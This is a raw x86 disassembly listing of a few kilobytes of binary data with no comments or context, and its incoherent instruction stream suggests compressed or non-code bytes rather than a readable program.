  4ab19d:	push   0x13
  4ab19f:	and    ah,BYTE PTR [edi+edi*1]
  4ab1a2:	call   0x528b:0x36373538
  4ab1a9:	inc    edi
  4ab1aa:	and    BYTE PTR [ebx+0x21],dl
  4ab1ad:	inc    eax
  4ab1ae:	push   0x21244a51
  4ab1b3:	lods   al,BYTE PTR fs:[esi]
  4ab1b5:	sub    ch,BYTE PTR [edx+0xa]
  4ab1b8:	cmp    BYTE PTR [ebp+0x14b77830],ch
  4ab1be:	dec    ebx
  4ab1bf:	pop    ebp
  4ab1c0:	xor    DWORD PTR [ecx-0x6e],eax
  4ab1c3:	loopne 0x4ab152
  4ab1c5:	out    0x11,al
  4ab1c7:	inc    ebp
  4ab1c8:	mov    ah,0x2a
  4ab1ca:	ins    BYTE PTR es:[edi],dx
  4ab1cb:	and    eax,0x3c033127
  4ab1d0:	add    dl,al
  4ab1d2:	push   esi
  4ab1d3:	push   cs
  4ab1d4:	adc    esp,ecx
  4ab1d6:	test   eax,0x38c501e1
  4ab1db:	sub    DWORD PTR [eax],edi
  4ab1dd:	inc    ebx
  4ab1de:	and    edx,DWORD PTR [eax-0x7cedfdf9]
  4ab1e4:	add    bl,bh
  4ab1e6:	pushf  
  4ab1e7:	and    al,0xf0
  4ab1e9:	and    al,0x84
  4ab1eb:	dec    edi
  4ab1ec:	test   al,0x81
  4ab1ee:	or     ch,0x77
  4ab1f1:	nop
  4ab1f2:	aam    0x4c
  4ab1f4:	push   eax
  4ab1f5:	mov    edx,0xdc37088d
  4ab1fa:	mov    edx,DWORD PTR [edi]
  4ab1fc:	or     eax,eax
  4ab1fe:	jns    0x4ab27b
  4ab200:	sbb    bl,BYTE PTR [ebx-0x7d]
  4ab203:	lock adc BYTE PTR [eax-0x3d],cl
  4ab207:	add    cl,0x43
  4ab20a:	das    
  4ab20b:	enter  0x23a9,0x11
  4ab20f:	cmp    BYTE PTR [esi],bh
  4ab211:	or     al,0xa0
  4ab213:	cmp    BYTE PTR [eax-0x37b87b11],dh
  4ab219:	movsx  esp,BYTE PTR [edx+0x30]
  4ab21d:	and    al,0x59
  4ab21f:	mov    dh,0x30
  4ab221:	ret    0x98ca
  4ab224:	outs   dx,BYTE PTR ds:[esi]
  4ab225:	or     BYTE PTR [edi-0x3f28d8b0],dl
  4ab22b:	xor    BYTE PTR [ebp-0x24068969],dl
  4ab231:	mov    dl,BYTE PTR [esi]
  4ab233:	pushf  
  4ab234:	mov    DWORD PTR [ebp-0x74],ebx
  4ab237:	mov    DWORD PTR [ebp+0x6428ac5c],ebx
  4ab23d:	lock adc DWORD PTR [eax+0x6c],edi
  4ab241:	adc    esp,ecx
  4ab243:	push   ebp
  4ab244:	test   al,0xa1
  4ab246:	push   es
  4ab247:	cmp    BYTE PTR [esi],0xca
  4ab24a:	jge    0x4ab248
  4ab24c:	pop    ebx
  4ab24d:	clc    
  4ab24e:	push   ebp
  4ab24f:	mov    dl,0xa1
  4ab251:	add    BYTE PTR [esi+0x4b805893],ah
  4ab257:	clc    
  4ab258:	adc    BYTE PTR [ecx+0x325e9cc1],al
  4ab25e:	fs pop edi
  4ab260:	mov    edx,0x2d4a8798
  4ab265:	pusha  
  4ab266:	mov    WORD PTR [edi+ebp*2],ss
  4ab269:	arpl   WORD PTR [edx],ax
  4ab26b:	adc    eax,0xca6d928
  4ab270:	shr    DWORD PTR [ebx],cl
  4ab272:	sar    DWORD PTR [ecx-0x4bfa4421],1
  4ab278:	jmp    0x4ab202
  4ab27a:	jg     0x4ab2b2
  4ab27c:	retf   0x8c0f
  4ab27f:	inc    eax
  4ab280:	inc    eax
  4ab281:	sub    eax,DWORD PTR [ebp+0x6c]
  4ab284:	inc    esi
  4ab285:	ret    
  4ab286:	mov    eax,0x38f6348c
  4ab28b:	inc    ebp
  4ab28c:	lock mov ds:0xca483580,eax
  4ab292:	int3   
  4ab293:	fldz   
  4ab295:	or     eax,0x32767121
  4ab29a:	mov    edi,DWORD PTR [ebp+0x58cb8b0f]
  4ab2a0:	fcom   DWORD PTR [edi]
  4ab2a2:	add    BYTE PTR [esi+ecx*2],dl
  4ab2a5:	push   edi
  4ab2a6:	xlat   BYTE PTR ds:[ebx]
  4ab2a7:	repnz lar esi,WORD PTR [ebx]
  4ab2ab:	or     eax,0x3f2028e
  4ab2b0:	dec    esp
  4ab2b1:	xor    BYTE PTR [eax+0xd4daa0],ah
  4ab2b7:	fs xchg esp,eax
  4ab2b9:	mov    ebx,0xeb460f83
  4ab2be:	pop    ds
  4ab2bf:	mov    ecx,DWORD PTR [ebx+0x3e]
  4ab2c2:	sbb    ebx,DWORD PTR [ebx+0x70]
  4ab2c5:	add    DWORD PTR [ebp+0x56],0x10
  4ab2c9:	add    eax,0x2446390b
  4ab2ce:	or     al,0xf1
  4ab2d0:	sub    al,0x10
  4ab2d2:	sar    ebp,1
  4ab2d4:	mov    dl,0x88
  4ab2d6:	mov    al,0x4b
  4ab2d8:	add    DWORD PTR [ecx],edx
  4ab2da:	clc    
  4ab2db:	xor    BYTE PTR [ebx],bl
  4ab2dd:	js     0x4ab303
  4ab2df:	jns    0x4ab351
  4ab2e1:	sar    ebx,0x6b
  4ab2e4:	inc    ecx
  4ab2e5:	push   esi
  4ab2e6:	jg     0x4ab2e9
  4ab2e8:	inc    ebp
  4ab2e9:	jne    0x4ab2fa
  4ab2eb:	ins    BYTE PTR es:[edi],dx
  4ab2ec:	inc    edi
  4ab2ed:	rcr    BYTE PTR [ebx-0x3e],0xa
  4ab2f1:	fadd   DWORD PTR [edi-0x6a]
  4ab2f4:	inc    edx
  4ab2f5:	mov    edi,0xc30938a1
  4ab2fa:	mov    al,ds:0x2ea22c4c
  4ab2ff:	outs   dx,BYTE PTR ds:[esi]
  4ab300:	(bad)  
  4ab301:	dec    eax
  4ab302:	adc    DWORD PTR [eax],eax
  4ab304:	cwde   
  4ab305:	inc    ecx
  4ab306:	(bad)  
  4ab307:	sbb    eax,DWORD PTR [esi]
  4ab309:	stos   BYTE PTR es:[edi],al
  4ab30a:	xchg   edx,eax
  4ab30b:	mov    esi,0x45db3846
  4ab310:	add    DWORD PTR [edi-0x3c],eax
  4ab313:	mov    BYTE PTR [ecx+0x5],al
  4ab316:	sti    
  4ab317:	and    al,0xd5
  4ab319:	dec    esp
  4ab31a:	cmp    eax,0x56f7a455
  4ab31f:	inc    eax
  4ab320:	add    DWORD PTR [ebx+0x742137c2],ebp
  4ab326:	sub    esi,eax
  4ab328:	add    edx,DWORD PTR [ebx-0x8]
  4ab32b:	call   FWORD PTR [eax+0x62]
  4ab32e:	mov    eax,ds:0xaaf00305
  4ab333:	pop    ebp
  4ab334:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4ab335:	add    cl,BYTE PTR [ebx-0x77f3a850]
  4ab33b:	dec    ebx
  4ab33c:	add    ch,BYTE PTR [edx]
  4ab33e:	jo     0x4ab30a
  4ab340:	add    al,ah
  4ab342:	push   ds
  4ab343:	or     DWORD PTR [ebx+eax*2+0xde6c03],edx
  4ab34a:	test   eax,0xdcfe9a89
  4ab34f:	pop    ds
  4ab350:	hlt    
  4ab351:	mov    BYTE PTR [eax+esi*8+0x749502d6],al
  4ab358:	xor    BYTE PTR [ecx-0x7f5ac06],al
  4ab35e:	dec    esi
  4ab35f:	dec    ebp
  4ab360:	sub    BYTE PTR [edx+0x47470157],cl
  4ab366:	sbb    al,0x73
  4ab368:	aas    
  4ab369:	xor    eax,0x20bcc60e
  4ab36e:	mov    BYTE PTR [ebp+ecx*1+0x61782e4b],al
  4ab375:	jno    0x4ab356
  4ab377:	inc    ecx
  4ab378:	xor    BYTE PTR [edi+eiz*8+0x6e],dh
  4ab37c:	jg     0x4ab3ea
  4ab37e:	or     al,0x1c
  4ab380:	fild   DWORD PTR [esi]
  4ab382:	dec    esp
  4ab383:	inc    ebp
  4ab384:	into   
  4ab385:	mov    BYTE PTR [ebx+edx*2+0x21],ch
  4ab389:	adc    bl,bl
  4ab38b:	push   eax
  4ab38c:	mov    eax,0xff8e57f4
  4ab391:	mov    eax,ds:0x49a21fbd
  4ab396:	add    ebx,edi
  4ab398:	mov    ecx,edi
  4ab39a:	mov    al,ch
  4ab39c:	jo     0x4ab3ab
  4ab39e:	push   0xe6040e16
  4ab3a3:	or     al,BYTE PTR [edx+0xb8c364e]
  4ab3a9:	retf   0xc890
  4ab3ac:	sbb    al,0xba
  4ab3ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4ab3af:	jbe    0x4ab418
  4ab3b1:	jae    0x4ab3de
  4ab3b3:	sar    BYTE PTR [edx+edi*1+0x3da504b5],1
  4ab3ba:	xor    edi,DWORD PTR [ebp-0x60]
  4ab3bd:	leave  
  4ab3be:	cmp    al,bh
  4ab3c0:	ficom  DWORD PTR [ebx-0x40]
  4ab3c3:	sub    dh,ch
  4ab3c5:	adc    ch,BYTE PTR [esi]
  4ab3c7:	cmp    eax,0xf0dacfc
  4ab3cc:	jnp    0x4ab417
  4ab3ce:	bound  esi,QWORD PTR [edx+0x4d]
  4ab3d1:	mul    BYTE PTR [ecx+eiz*8]
  4ab3d4:	xchg   ebp,eax
  4ab3d5:	call   0xd2ea:0x10f12afa
  4ab3dc:	pop    esp
  4ab3dd:	call   0xbe7b:0x333f3c2b
  4ab3e4:	out    dx,al
  4ab3e5:	pop    esi
  4ab3e6:	xor    BYTE PTR [edx-0x3118fde1],dh
  4ab3ec:	push   esi
  4ab3ed:	adc    DWORD PTR [esi+ebp*8],eax
  4ab3f0:	or     BYTE PTR [eax],dl
  4ab3f2:	sbb    edx,DWORD PTR [eax+esi*1+0x4a96b004]
  4ab3f9:	cli    
  4ab3fa:	ins    DWORD PTR es:[edi],dx
  4ab3fb:	jo     0x4ab381
  4ab3fd:	enter  0x61d4,0xaa
  4ab401:	dec    eax
  4ab402:	mov    DWORD PTR [edx+ebx*1+0x1211e04c],edx
  4ab409:	das    
  4ab40a:	or     DWORD PTR [ecx+0x75741f86],ebp
  4ab410:	and    bh,cl
  4ab412:	inc    ecx
  4ab413:	mov    ds:0xb6ad48cb,eax
  4ab418:	repnz inc esp
  4ab41a:	or     DWORD PTR [ecx+0x27],esi
  4ab41d:	pop    ebx
  4ab41e:	fdiv   DWORD PTR [esp+ebp*2+0x1a]
  4ab422:	jp     0x4ab49c
  4ab424:	sbb    DWORD PTR [edi+0x92ac1a7],0x23
  4ab42b:	jne    0x4ab487
  4ab42d:	inc    edi
  4ab42e:	test   DWORD PTR [ecx+0x67],eax
  4ab431:	or     BYTE PTR [eax-0x14],bh
  4ab434:	inc    esi
  4ab435:	or     BYTE PTR ds:0x1826401c,ah
  4ab43b:	add    BYTE PTR gs:[esi+eiz*1],0x75
  4ab440:	cwde   
  4ab441:	clc    
  4ab442:	das    
  4ab443:	cmp    BYTE PTR [eax],cl
  4ab445:	cld    
  4ab446:	es push esi
  4ab448:	push   esi
  4ab449:	pop    esp
  4ab44a:	xchg   ebx,eax
  4ab44b:	push   ebx
  4ab44c:	mov    eax,0x5c4b361f
  4ab451:	lea    edi,[edi+eax*1-0x1]
  4ab455:	test   BYTE PTR [edx-0x2e],ah
  4ab458:	dec    esi
  4ab459:	xor    ebx,DWORD PTR [eax+ebp*4+0x6c]
  4ab45d:	in     al,dx
  4ab45e:	clc    
  4ab45f:	add    eax,0xf1b83985
  4ab464:	je     0x4ab4c8
  4ab466:	in     al,dx
  4ab467:	not    DWORD PTR [edx+0x32]
  4ab46a:	retf   0xfa78
  4ab46d:	jl     0x4ab487
  4ab46f:	cmp    eax,DWORD PTR [edx-0x7d0ae4bc]
  4ab475:	jnp    0x4ab477
  4ab477:	sub    BYTE PTR [edi+0xc],al
  4ab47a:	icebp  
  4ab47b:	and    DWORD PTR [ebp-0x3d47fa80],edx
  4ab481:	sub    ch,BYTE PTR [ebx]
  4ab483:	inc    ecx
  4ab484:	xchg   edi,eax
  4ab485:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4ab486:	es push esi
  4ab488:	adc    BYTE PTR [edi+ecx*2],dh
  4ab48b:	test   DWORD PTR [eax-0x6b9d706],esp
  4ab491:	outs   dx,BYTE PTR ds:[esi]
  4ab492:	sar    DWORD PTR [esi],cl
  4ab494:	adc    DWORD PTR [eax],edi
  4ab496:	inc    edx
  4ab497:	jp     0x4ab4df
  4ab499:	popa   
  4ab49a:	push   ss
  4ab49b:	bound  edx,QWORD PTR [eax]
  4ab49d:	test   BYTE PTR [ecx+0x368b47c7],al
  4ab4a3:	inc    ecx
  4ab4a4:	js     0x4ab4d6
  4ab4a6:	sub    DWORD PTR [eax-0x19e822f1],eax
  4ab4ac:	rcr    DWORD PTR [edx],cl
  4ab4ae:	add    al,BYTE PTR [ecx+0x1056e07]
  4ab4b4:	ins    DWORD PTR es:[edi],dx
  4ab4b5:	je     0x4ab52c
  4ab4b7:	lods   eax,DWORD PTR ds:[esi]
  4ab4b8:	xchg   edi,eax
  4ab4b9:	stos   BYTE PTR es:[edi],al
  4ab4ba:	aam    0xd2
  4ab4bc:	dec    ecx
  4ab4bd:	mov    cl,0xb0
  4ab4bf:	ss push 0xffffffc8
  4ab4c2:	(bad)  
  4ab4c3:	out    dx,al
  4ab4c4:	loopne 0x4ab4cf
  4ab4c6:	js     0x4ab518
  4ab4c8:	nop
  4ab4c9:	addr16 jo 0x4ab4e6
  4ab4cc:	xor    BYTE PTR [ebx+0x47],al
  4ab4cf:	xchg   ebp,eax
  4ab4d0:	jl     0x4ab4fd
  4ab4d2:	jb     0x4ab4ef
  4ab4d4:	mov    edi,0xfb2f1b31
  4ab4d9:	jno    0x4ab469
  4ab4db:	outs   dx,DWORD PTR ds:[esi]
  4ab4dc:	jne    0x4ab4e4
  4ab4de:	popa   
  4ab4df:	enter  0x944c,0xa0
  4ab4e3:	add    DWORD PTR [ebp-0x5e],ebp
  4ab4e6:	mov    eax,0x30240415
  4ab4eb:	lods   al,BYTE PTR ds:[esi]
  4ab4ec:	mov    dh,bl
  4ab4ee:	in     al,dx
  4ab4ef:	ds ret 0xf6cf
  4ab4f3:	dec    ebp
  4ab4f4:	mov    al,ds:0xf76f7c88
  4ab4f9:	inc    esi
  4ab4fa:	push   cs
  4ab4fb:	sbb    ecx,DWORD PTR [esi+0x9aa9936]
  4ab501:	repz or ecx,DWORD PTR [ecx-0x65]
  4ab505:	mov    DWORD PTR [ecx],0x801c2040
  4ab50b:	cs js  0x4ab547
  4ab50e:	and    ebx,DWORD PTR [edx-0x4520f5b6]
  4ab514:	jo     0x4ab552
  4ab516:	cmp    ch,BYTE PTR [esi-0x7fa4c2d2]
  4ab51c:	shl    DWORD PTR [esp+ebx*4],1
  4ab51f:	dec    esi
  4ab520:	or     DWORD PTR [ecx+edx*8-0x71],ebp
  4ab524:	push   edx
  4ab525:	xor    ebx,esp
  4ab527:	sahf   
  4ab528:	add    DWORD PTR [edi-0x87f87d7],0x20
  4ab52f:	xchg   ah,ch
  4ab531:	inc    edi
  4ab532:	add    eax,0x1082e90f
  4ab537:	inc    esp
  4ab538:	sahf   
  4ab539:	hlt    
  4ab53a:	and    eax,0xbc209121
  4ab53f:	push   0x3f
  4ab541:	inc    ebp
  4ab542:	je     0x4ab52f
  4ab544:	in     eax,0xcc
  4ab546:	call   0x535fb9f5
  4ab54b:	sbb    DWORD PTR [eax+ebp*8-0x7c],0xeb2a0295
  4ab553:	int3   
  4ab554:	sub    al,0x5
  4ab556:	mov    bh,0xef
  4ab558:	sub    DWORD PTR [ebp-0x73],ebx
  4ab55b:	inc    ecx
  4ab55c:	mov    ds:0x5d12bbeb,eax
  4ab561:	jne    0x4ab598
  4ab563:	xor    edi,eax
  4ab565:	add    ecx,DWORD PTR [ecx]
  4ab567:	stos   BYTE PTR es:[edi],al
  4ab568:	in     al,dx
  4ab569:	push   ebp
  4ab56a:	call   0x5056:0x9873c083
  4ab571:	xor    BYTE PTR [esi+0x5cf43b6],al
  4ab577:	ror    BYTE PTR [edx-0x46],0xe0
  4ab57b:	mov    eax,0x7aee339d
  4ab580:	sbb    al,bl
  4ab582:	xchg   edx,eax
  4ab583:	(bad)  
  4ab584:	push   edi
  4ab585:	push   eax
  4ab586:	sbb    BYTE PTR [ebp-0x6e],0xd2
  4ab58a:	pusha  
  4ab58b:	repnz mov ds:0x87690dec,al
  4ab591:	jbe    0x4ab56a
  4ab593:	cmp    esp,eax
  4ab595:	lea    esi,[ebx+0x4]
  4ab598:	cs in  al,0x1b
  4ab59b:	jne    0x4ab54d
  4ab59d:	(bad)  
  4ab59e:	cmp    BYTE PTR [ecx+0x2952a6b2],ah
  4ab5a4:	(bad)  
  4ab5a6:	push   ebx
  4ab5a7:	pusha  
  4ab5a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4ab5a9:	inc    edi
  4ab5aa:	inc    eax
  4ab5ab:	sbb    al,0x8e
  4ab5ad:	es xchg edi,eax
  4ab5af:	mov    DWORD PTR [edi*1+0x15d8b98d],eax
  4ab5b6:	add    DWORD PTR [ebp-0x6d],edi
  4ab5b9:	xor    al,0x1
  4ab5bb:	inc    edi
  4ab5bc:	jmp    0x8a69:0x308cec5
  4ab5c3:	push   esp
  4ab5c4:	and    eax,DWORD PTR [ecx]
  4ab5c6:	add    BYTE PTR [ebp-0x3858f239],bh
  4ab5cc:	add    cl,BYTE PTR [ebp+0xa]
  4ab5cf:	pop    ecx
  4ab5d0:	ja     0x4ab5ed
  4ab5d2:	sar    DWORD PTR [eax+0x46],0x88
  4ab5d6:	cmp    cl,BYTE PTR [esp+eiz*8]
  4ab5d9:	nop
  4ab5da:	push   ds
  4ab5db:	inc    edi
  4ab5dc:	sub    DWORD PTR [edx-0x37],esp
  4ab5df:	and    al,0xc5
  4ab5e1:	add    BYTE PTR [eax+0x2195032a],0x5b
  4ab5e8:	enter  0x5a04,0x53
  4ab5ec:	mov    ds:0x53da9590,eax
  4ab5f1:	sub    DWORD PTR [ebp+eiz*4+0x6a479216],0x81af405
  4ab5fc:	test   al,0x3a
  4ab5fe:	test   DWORD PTR [eax],ebp
  4ab600:	add    ah,bh
  4ab602:	(bad)  
  4ab603:	pop    ebx
  4ab604:	les    eax,FWORD PTR [edi]
  4ab606:	add    al,0x8e
  4ab608:	(bad)  
  4ab609:	add    DWORD PTR [ecx],edx
  4ab60b:	mov    ch,BYTE PTR [edi-0x70]
  4ab60e:	cmp    bl,BYTE PTR [edx+0x14]
  4ab611:	pop    esp
  4ab612:	test   al,0x14
  4ab614:	mov    dh,0x5
  4ab616:	int3   
  4ab617:	int3   
  4ab618:	add    DWORD PTR [esi],ebx
  4ab61a:	adc    al,dl
  4ab61c:	add    DWORD PTR [ebx+0x1b],ebp
  4ab61f:	test   BYTE PTR [eax],al
  4ab621:	imul   ecx
  4ab623:	retf   0x3e1e
  4ab626:	pop    ebx
  4ab627:	sub    dh,bl
  4ab629:	jl     0x4ab667
  4ab62b:	dec    esi
  4ab62c:	addr16 cmp al,0x36
  4ab62f:	or     al,0x8
  4ab631:	cmp    eax,0x2434218c
  4ab636:	cdq    
  4ab637:	repz aas 
  4ab639:	push   eax
  4ab63a:	mov    DWORD PTR [esi],esi
  4ab63c:	cmp    esp,DWORD PTR [eax]
  4ab63e:	test   BYTE PTR [ecx+0x24da3a95],al
  4ab644:	arpl   bx,bp
  4ab646:	imul   eax,eax,0x7125365a
  4ab64c:	jne    0x4ab67e
  4ab64e:	pop    ebx
  4ab64f:	fsub   DWORD PTR [edx+0x70]
  4ab652:	daa    
  4ab653:	inc    esi
  4ab654:	lahf   
  4ab655:	xor    cl,al
  4ab657:	inc    ebx
  4ab658:	leave  
  4ab659:	add    al,0x25
  4ab65b:	add    esi,DWORD PTR [eax]
  4ab65d:	inc    edx
  4ab65e:	xchg   ecx,eax
  4ab65f:	(bad)  [edi+0x29]
  4ab662:	cmp    al,0xe0
  4ab664:	cdq    
  4ab665:	sub    eax,edi
  4ab667:	popf   
  4ab668:	dec    ebp
  4ab669:	invd   
  4ab66b:	cmp    eax,0x685288dd
  4ab670:	jb     0x4ab673
  4ab672:	mov    dh,0x2
  4ab674:	jg     0x4ab635
  4ab676:	rol    BYTE PTR [eax-0x7481b3a6],0xc
  4ab67d:	mov    ebp,0xe2487018
  4ab682:	adc    al,0x75
  4ab684:	ins    BYTE PTR es:[edi],dx
  4ab685:	jbe    0x4ab6d4
  4ab687:	fmul   DWORD PTR [edx]
  4ab689:	push   ecx
  4ab68a:	inc    esi
  4ab68b:	and    BYTE PTR [esi],bl
  4ab68d:	mul    edi
  4ab68f:	sbb    eax,0x8b1c3047
  4ab694:	cmp    al,0xbd
  4ab696:	and    BYTE PTR [esp+ecx*1],cl
  4ab699:	dec    ebp
  4ab69a:	loope  0x4ab6ea
  4ab69c:	xor    cl,BYTE PTR [edx-0x36e88bb4]
  4ab6a2:	jp     0x4ab6b8
  4ab6a4:	js     0x4ab6b8
  4ab6a6:	dec    esp
  4ab6a7:	or     BYTE PTR [ebp+eax*1-0x1112bfa5],dl
  4ab6ae:	mov    ds:0xebf0fc09,eax
  4ab6b3:	and    esi,esi
  4ab6b5:	shl    BYTE PTR [eax],cl
  4ab6b7:	daa    
  4ab6b8:	and    DWORD PTR [eax+ecx*4+0x794eee76],edx
  4ab6bf:	pushf  
  4ab6c0:	fucomi st,st(7)
  4ab6c2:	push   edi
  4ab6c3:	adc    dh,al
  4ab6c5:	or     DWORD PTR [eax-0x3cd3de5b],eax
  4ab6cb:	jmp    0x4ab6d9
  4ab6cd:	sbb    al,BYTE PTR [edx]
  4ab6cf:	jne    0x4ab6c9
  4ab6d1:	inc    edx
  4ab6d2:	jp     0x4ab66e
  4ab6d4:	pop    es
  4ab6d5:	sub    edi,DWORD PTR [edi+0x8]
  4ab6d8:	int3   
  4ab6d9:	je     0x4ab70f
  4ab6db:	(bad)  
  4ab6dc:	(bad)  
  4ab6dd:	pop    edx
  4ab6de:	adc    DWORD PTR [edi-0x2e099074],edx
  4ab6e4:	or     BYTE PTR [eax],dl
  4ab6e6:	ins    BYTE PTR es:[edi],dx
  4ab6e7:	and    DWORD PTR [ecx+0x18],0x8bea1e0d
  4ab6ee:	mov    ebp,0x4856478b
  4ab6f3:	jp     0x4ab73d
  4ab6f5:	or     DWORD PTR [bx+di+0x2b],0x39
  4ab6fa:	ss enter 0x4cf,0x5b
  4ab6ff:	in     al,dx
  4ab700:	cmc    
  4ab701:	rol    DWORD PTR [eax+0x40751e17],0xa8
  4ab708:	jg     0x4ab73e
  4ab70a:	call   0xf8fc8721
  4ab70f:	add    DWORD PTR [eax+0x1286b2fc],esi
  4ab715:	nop
  4ab716:	rcr    BYTE PTR [ebp-0x1db4b3c1],1
  4ab71c:	push   ss
  4ab71d:	and    eax,DWORD PTR [ebp+0x6c46157e]
  4ab723:	sbb    edi,DWORD PTR [edx]
  4ab725:	mov    al,ds:0x8b0562d4
  4ab72a:	mov    al,0x78
  4ab72c:	inc    edx
  4ab72d:	bound  edx,QWORD PTR [edi+0x36]
  4ab730:	leave  
  4ab731:	add    al,0xc4
  4ab733:	ins    DWORD PTR es:[edi],dx
  4ab734:	xor    BYTE PTR [ebp+0x22e902c7],bl
  4ab73a:	dec    ebx
  4ab73b:	cmp    eax,0xebec821e
  4ab740:	mov    ebx,DWORD PTR [ebx]
  4ab742:	int3   
  4ab743:	arpl   WORD PTR [eax],sp
  4ab745:	adc    esp,DWORD PTR [edi]
  4ab747:	or     al,0x42
  4ab749:	ins    BYTE PTR es:[edi],dx
  4ab74a:	neg    BYTE PTR [edi-0x7cdbc7bc]
  4ab750:	dec    eax
  4ab751:	dec    eax
  4ab752:	and    BYTE PTR [ecx],bh
  4ab754:	mov    WORD PTR ss:[edx+0x2b248f07],gs
  4ab75b:	pop    esi
  4ab75c:	jnp    0x4ab78b
  4ab75e:	pop    edx
  4ab75f:	mov    al,ds:0x5b034207
  4ab764:	cmp    ecx,eax
  4ab766:	or     DWORD PTR ds:0x9a3104ca,eax
  4ab76c:	push   0x9e99df2e
  4ab771:	int    0x1a
  4ab773:	xor    al,0xee
  4ab775:	jmp    0x4ab785
  4ab777:	or     BYTE PTR [esi],ah
  4ab779:	pop    ecx
  4ab77a:	jo     0x4ab7ec
  4ab77c:	mov    eax,ds:0x1901acb8
  4ab781:	adc    edi,DWORD PTR [edx]
  4ab783:	jo     0x4ab7bf
  4ab785:	inc    edx
  4ab786:	mov    ebx,0x612a8912
  4ab78b:	and    al,0x6a
  4ab78d:	or     ebx,0x79
  4ab790:	or     BYTE PTR [ecx],al
  4ab792:	push   ds
  4ab793:	sbb    ah,0x90
  4ab796:	xchg   edx,eax
  4ab797:	test   al,0x65
  4ab799:	xchg   ebp,eax
  4ab79a:	xchg   edi,eax
  4ab79b:	xchg   esi,eax
  4ab79c:	loopne 0x4ab7ea
  4ab79e:	add    al,0xfb
  4ab7a0:	fdiv   QWORD PTR [eax]
  4ab7a2:	cld    
  4ab7a3:	push   es
  4ab7a4:	jmp    0x54d5af7d
  4ab7a9:	pop    es
  4ab7aa:	inc    eax
  4ab7ab:	jns    0x4ab7cd
  4ab7ad:	in     eax,0x54
  4ab7af:	aaa    
  4ab7b0:	out    dx,eax
  4ab7b1:	mov    ds:0x5137051b,eax
  4ab7b6:	fdiv   DWORD PTR [ecx+0x193e4ccc]
  4ab7bc:	in     eax,dx
  4ab7bd:	inc    ebx
  4ab7be:	sbb    eax,ebx
  4ab7c0:	jge    0x4ab775
  4ab7c2:	xor    al,0x7f
  4ab7c4:	xchg   esp,eax
  4ab7c5:	pop    es
  4ab7c6:	mov    al,ds:0x8ec850c
  4ab7cb:	sub    edx,DWORD PTR [ecx+ecx*1]
  4ab7ce:	aam    0x55
  4ab7d0:	cdq    
  4ab7d1:	fdivr  DWORD PTR [ebx+0x69]
  4ab7d4:	pop    ebp
  4ab7d5:	mov    WORD PTR [edi-0x5b],ds
  4ab7d8:	jmp    0x178a:0x7ee4fa28
  4ab7df:	or     BYTE PTR [ebp-0x8dbdbdb],dl
  4ab7e5:	dec    esp
  4ab7e6:	ins    DWORD PTR es:[edi],dx
  4ab7e7:	xor    dh,BYTE PTR [eax-0x7548e5e5]
  4ab7ed:	or     al,0x7
  4ab7ef:	push   ebx
  4ab7f0:	lock or dh,bl
  4ab7f3:	ins    BYTE PTR es:[edi],dx
  4ab7f4:	stc    
  4ab7f5:	mov    ecx,edi
  4ab7f7:	lea    edi,[eax-0x6035d435]
  4ab7fd:	add    al,0x9b
  4ab7ff:	mov    ds:0x59bc8d77,al
  4ab804:	push   es
  4ab805:	invd   
  4ab807:	pop    ss
  4ab808:	pop    ds
  4ab809:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4ab80a:	idiv   BYTE PTR [esi-0x68727f12]
  4ab810:	or     BYTE PTR [ebp+0x8],dh
  4ab813:	pop    ss
  4ab814:	and    dh,BYTE PTR [eax+0x2]
  4ab817:	xor    al,al
  4ab819:	(bad)  
  4ab81a:	fadd   DWORD PTR [eax+0x7d01804d]
  4ab820:	je     0x4ab7c3
  4ab822:	test   DWORD PTR [ebx-0x43],ecx
  4ab825:	ret    0x5646
  4ab828:	push   0x10700120
  4ab82d:	(bad)  
  4ab82e:	xchg   ecx,eax
  4ab82f:	scas   al,BYTE PTR es:[edi]
  4ab830:	popf   
  4ab831:	jge    0x4ab880
  4ab833:	into   
  4ab834:	xchg   edx,eax
  4ab835:	add    esi,eax
  4ab837:	das    
  4ab838:	push   cs
  4ab839:	sbb    BYTE PTR [ecx],ah
  4ab83b:	add    dl,BYTE PTR [edi]
  4ab83d:	fild   DWORD PTR [esi+0x1820007c]
  4ab843:	or     ah,BYTE PTR [eax]
  4ab845:	pop    ebp
  4ab846:	das    
  4ab847:	xchg   DWORD PTR es:[eax+ebp*2+0x21],esp
  4ab84c:	pop    edi
  4ab84d:	add    BYTE PTR [eax],dh
  4ab84f:	jo     0x4ab833
  4ab851:	ret    0xf83a
  4ab854:	cmp    BYTE PTR [esi],ah
  4ab856:	int3   
  4ab857:	inc    edi
  4ab858:	sti    
  4ab859:	dec    esi
  4ab85a:	cmp    eax,0xf7e3ab60
  4ab85f:	and    ebx,DWORD PTR [edx-0xcb1d3a3]
  4ab865:	adc    cl,BYTE PTR [ebx+0x44]
  4ab868:	test   eax,0xa7409212
  4ab86d:	or     ah,BYTE PTR [ebx]
  4ab86f:	sbb    al,0xba
  4ab871:	mov    eax,0x593d2895
  4ab876:	(bad)  
  4ab877:	xchg   edx,eax
  4ab878:	ins    BYTE PTR es:[edi],dx
  4ab879:	push   0xe17d05dc
  4ab87e:	rcr    DWORD PTR [ebp-0x24],1
  4ab881:	xchg   edx,eax
  4ab882:	adc    ah,dl
  4ab884:	loopne 0x4ab8d2
  4ab886:	inc    edx
  4ab887:	sub    eax,0xdc2eec61
  4ab88c:	and    dl,al
  4ab88e:	cmp    eax,0xbb1cc8f2
  4ab893:	imul   esp,DWORD PTR [esi+0x5e334f10],0xffffff8b
  4ab89a:	mov    al,ds:0x856006d6
  4ab89f:	lsl    esp,WORD PTR [edx]
  4ab8a2:	or     eax,0x69d5c1f6
  4ab8a7:	add    al,BYTE PTR [esp+0x32]
  4ab8ab:	mov    dh,0xc9
  4ab8ad:	dec    esp
  4ab8ae:	test   eax,0xe02cb5f0
  4ab8b3:	mov    BYTE PTR [ebx],0x50
  4ab8b6:	int3   
  4ab8b7:	popa   
  4ab8b8:	fdivr  st(7),st
  4ab8ba:	and    DWORD PTR [edx+esi*8+0x18020c96],edi
  4ab8c1:	mov    eax,0x4015f8c1
  4ab8c6:	dec    esi
  4ab8c7:	add    DWORD PTR [ebx],ebp
  4ab8c9:	retf   
  4ab8ca:	push   edx
  4ab8cb:	and    BYTE PTR [ebx+0x52],dl
